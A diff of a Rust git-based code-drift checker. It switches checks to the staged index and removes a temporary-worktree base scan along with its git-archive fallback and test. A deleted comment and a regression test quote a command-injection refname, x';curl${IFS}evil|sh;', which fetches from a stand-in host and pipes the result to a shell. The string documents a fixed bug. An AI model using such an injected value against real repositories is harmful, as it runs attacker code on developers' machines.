@@ -13,9 +13,8 @@ use crate::report::{Group, Member, Stats, Tier, UnitSummary};
 use anyhow::{Context, bail};
 use serde::Serialize;
 use std::collections::{HashMap, HashSet};
-use std::ffi::OsString;
 use std::path::{Path, PathBuf};
-use std::process::{Command, Stdio};
+use std::process::Command;
 
 /// Divergence increase below this is measurement noise, not drift (D20).
 pub const DIVERGENCE_EPS: f64 = 0.01;
@@ -52,7 +51,7 @@ impl DiffMap {
 /// GIT_INDEX_FILE/GIT_DIR/GIT_WORK_TREE redirects this process's git
 /// children at the CALLER's repo state (a pre-commit hook's index),
 /// corrupting it. Always spawn git through here.
-fn git_cmd(repo: &Path) -> Command {
+pub(crate) fn git_cmd(repo: &Path) -> Command {
     let mut cmd = Command::new("git");
     cmd.arg("-C").arg(repo);
     cmd.env_remove("GIT_INDEX_FILE");
@@ -73,6 +72,10 @@ fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
             String::from_utf8_lossy(&probe.stderr).trim()
         );
     }
+    // --cached: base..INDEX, never base..worktree. `check` weighs the prospective
+    // COMMIT, so an edit nobody staged is not a change `check` has any business
+    // reporting — without this, a pre-commit hook on a shared or multi-agent
+    // checkout fails commits over other sessions' work-in-progress.
     // --relative both restricts the diff to the scan root and emits paths
     // relative to it; -U0 hunks carry exact touched ranges (D7a).
     let out = git_cmd(root)
@@ -81,6 +84,7 @@ fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
             "--no-ext-diff",
             "--no-color",
             "--relative",
+            "--cached",
             "-U0",
             base,
         ])
@@ -88,7 +92,7 @@ fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
         .context("running git diff")?;
     if !out.status.success() {
         bail!(
-            "git diff -U0 {base} failed: {}",
+            "git diff --cached -U0 {base} failed: {}",
             String::from_utf8_lossy(&out.stderr).trim()
         );
     }
@@ -274,108 +278,6 @@ fn select_unit<'a>(
     })
 }
 
-/// Temp worktree of the base ref; removed on drop.
-struct BaseWorktree {
-    repo: PathBuf,
-    dir: tempfile::TempDir,
-    /// True when populated via the git-archive fallback: nothing to
-    /// `git worktree remove` on drop.
-    archived: bool,
-}
-
-/// Argv (arguments only) for the `git archive | tar -x` base fallback, as two
-/// verbatim vectors — NO shell. `base` flows from untrusted input (`--base` or
-/// a scanned repo's `[baseline] ref`), and a git refname may legally contain
-/// `'"$;|{}`; the old `sh -c` string-interpolated it, so a malicious ref like
-/// `x';curl${IFS}evil|sh;'` executed arbitrary commands (cute-coral). Passing
-/// every value as its own argv element makes those metacharacters inert.
-/// The `-C <repo>` git normally needs is supplied by `git_cmd` at the call
-/// site, not here, so it isn't emitted twice.
-fn archive_argv(base: &str, dest: &Path) -> (Vec<OsString>, Vec<OsString>) {
-    let git = vec![OsString::from("archive"), OsString::from(base)];
-    let tar = vec![
-        OsString::from("-x"),
-        OsString::from("-C"),
-        dest.as_os_str().to_os_string(),
-    ];
-    (git, tar)
-}
-
-impl BaseWorktree {
-    fn add(repo: &Path, base: &str) -> anyhow::Result<BaseWorktree> {
-        let dir = tempfile::TempDir::new()?;
-        let path = dir.path().join("base");
-        let out = git_cmd(repo)
-            .args(["worktree", "add", "--detach", "-q"])
-            .arg(&path)
-            .arg(base)
-            .output()?;
-        if out.status.success() {
-            return Ok(BaseWorktree {
-                repo: repo.to_path_buf(),
-                dir,
-                archived: false,
-            });
-        }
-        // Fallback (D41): `git worktree add` depends on per-checkout admin
-        // state and has failed in the field on multi-worktree clones
-        // (".git/index: Not a directory"). `git archive` only reads objects —
-        // no worktree machinery at all. Caveat: it honors export-ignore
-        // attributes, so an attribute-excluded file would be missing from the
-        // base scan; acceptable for a fallback path.
-        std::fs::create_dir_all(&path)?;
-        let (git_args, tar_args) = archive_argv(base, &path);
-        // Spawn `git archive` and pipe its stdout straight into `tar -x`. Every
-        // value is a verbatim argv element — no `sh -c`, so refname/path
-        // metacharacters (`'"$;|{}`) can't be interpreted (cute-coral).
-        let mut git = git_cmd(repo)
-            .args(&git_args)
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
-            .spawn()
-            .context("spawning git archive for the base fallback")?;
-        let git_stdout = git.stdout.take().expect("git stdout was piped");
-        // tar reads git's stdout to EOF; git exits (closing stdout) on error, so
-        // there is no pipe deadlock and git's tiny stderr is drained after.
-        let tar = Command::new("tar")
-            .args(&tar_args)
-            .stdin(Stdio::from(git_stdout))
-            .output()
-            .context("spawning tar for the base fallback")?;
-        let git = git
-            .wait_with_output()
-            .context("waiting on git archive for the base fallback")?;
-        anyhow::ensure!(
-            git.status.success() && tar.status.success(),
-            "git worktree add for base `{base}` failed ({}) and the git-archive \
-             fallback also failed (git: {}; tar: {})",
-            String::from_utf8_lossy(&out.stderr).trim(),
-            String::from_utf8_lossy(&git.stderr).trim(),
-            String::from_utf8_lossy(&tar.stderr).trim(),
-        );
-        Ok(BaseWorktree {
-            repo: repo.to_path_buf(),
-            dir,
-            archived: true,
-        })
-    }
-    fn path(&self) -> PathBuf {
-        self.dir.path().join("base")
-    }
-}
-
-impl Drop for BaseWorktree {
-    fn drop(&mut self) {
-        if self.archived {
-            return; // TempDir cleanup suffices
-        }
-        let _ = git_cmd(&self.repo)
-            .args(["worktree", "remove", "--force"])
-            .arg(self.path())
-            .output();
-    }
-}
-
 /// Version legs that MUST bust the base-state snapshot when they move — the
 /// exact set the per-file cache key folds in (`src/cache.rs`). The per-file
 /// cache invalidates on a grammar / extraction / IR-scheme / tool-version bump,
@@ -427,13 +329,19 @@ fn base_state_cfg_sig(cfg: &Config, legs: &VersionLegs) -> u64 {
     xxhash_rust::xxh3::xxh3_64(&buf)
 }
 
-/// Base state for the comparison (spec §6 semantics, two sources):
-/// - a baseline FILE (optional curation layer: fixed "since acceptance"
-///   reference; the file itself is a derived artifact and defaults to living
-///   transiently under .reprise/) — used when present;
-/// - otherwise TWO-SCAN: scan the base ref in a temp worktree and synthesize
-///   the same entry set. Cached transiently under .reprise/base-state/ keyed
-///   by resolved base SHA + config, so repeat checks skip the base scan.
+/// Base state for the comparison (spec §6 semantics): TWO-SCAN — scan the base
+/// ref and synthesize the same entry set. Cached transiently under
+/// .reprise/base-state/ keyed by resolved base SHA + config, so repeat checks
+/// skip the base scan.
+///
+/// The base ref is read STRAIGHT FROM THE OBJECT STORE (`GitRev::Ref`), never
+/// checked out. The previous implementation ran `git worktree add` inside the
+/// scanned repo and removed it in `Drop` — but `Drop` does not run on SIGKILL,
+/// and an OOM-killed scan is precisely that, so a killed `check` could strand a
+/// worktree registration in the user's `.git`. A report-only tool must not leave
+/// admin state in the repo it reports on. Reading objects also retires the D41
+/// `git archive` fallback: object reads do not care about the checkout layout
+/// that made `worktree add` fail.
 fn base_state(root: &Path, cfg: &Config, base: &str) -> anyhow::Result<(Baseline, String)> {
     let sha_out = git_cmd(root)
         .args(["rev-parse", "--verify"])
@@ -455,11 +363,10 @@ fn base_state(root: &Path, cfg: &Config, base: &str) -> anyhow::Result<(Baseline
     {
         return Ok((b, "base-scan (cached)".to_string()));
     }
-    let wt = BaseWorktree::add(root, base)?;
-    let mut base_cfg = cfg.clone();
-    base_cfg.cache.shared_root = Some(root.to_path_buf());
-    let base_report = crate::scan(&wt.path(), &base_cfg)?;
-    let b = crate::baseline::create(&base_report, &wt.path());
+    let base_src =
+        crate::source::GitSource::new(root, crate::source::GitRev::Ref(sha.clone()), cfg)?;
+    let base_report = crate::scan_source(&base_src, cfg)?;
+    let b = crate::baseline::create(&base_report, root);
     if cfg.cache.enabled {
         let _ = std::fs::create_dir_all(cache_path.parent().unwrap());
         let _ = b.save(&cache_path);
@@ -478,7 +385,12 @@ pub fn run(
     let threshold = Tier::parse_fail_on(&fail_on)?;
     let (baseline, base_state) = base_state(root, cfg, base)?;
     let baseline = Some(baseline);
-    let report = crate::scan(root, cfg)?;
+    // THE INDEX, not the checkout: `check` judges the bytes that are about to be
+    // committed. Reading the worktree here is what let an unstaged edit — another
+    // session's work-in-progress on a shared checkout — fail a commit that did not
+    // contain it.
+    let index = crate::source::GitSource::new(root, crate::source::GitRev::Index, cfg)?;
+    let report = crate::scan_source(&index, cfg)?;
 
     let rel = |p: &Path| relative_file(p, root);
     let fails = |tier: Tier| -> bool {
@@ -892,44 +804,6 @@ deleted file mode 100644
         assert!(!map.touches("src/a.rs", (42, 45)));
         assert!(map.touches("src/dead.rs", (3, 7)));
         assert!(!map.file_touched("src/other.rs"));
-    }
-
-    // ---- cute-coral: git-archive fallback argv is shell-free ----
-
-    #[test]
-    fn archive_argv_passes_values_verbatim_no_shell() {
-        // A malicious `[baseline] ref` can pin a refname with shell metacharacters;
-        // the old `sh -c` executed them. Each value must be one verbatim argv
-        // element, and no element may be a shell string joining the pieces.
-        // (`-C <repo>` is supplied by `git_cmd` at the call site, not here.)
-        let base = "x';curl${IFS}evil|sh;'";
-        let dest = Path::new("/tmp/base dir");
-        let (git, tar) = archive_argv(base, dest);
-        assert_eq!(
-            git,
-            vec![
-                OsString::from("archive"),
-                OsString::from("x';curl${IFS}evil|sh;'"),
-            ]
-        );
-        assert_eq!(
-            tar,
-            vec![
-                OsString::from("-x"),
-                OsString::from("-C"),
-                OsString::from("/tmp/base dir"),
-            ]
-        );
-        // The `|` inside `base` is carried verbatim as ONE element (that is the
-        // fix — inert, not a shell pipe). What must NOT exist is an element that
-        // shell-joins git into tar, i.e. the old `| tar` interpolation.
-        assert!(
-            !git.iter()
-                .chain(tar.iter())
-                .any(|a| a.to_string_lossy().contains("| tar"))
-        );
-        // And git's argv never references tar: the two commands are separate.
-        assert!(!git.iter().any(|a| a.to_string_lossy().contains("tar")));
     }
 
     // ---- bold-yelp: base-state key folds the version legs ----
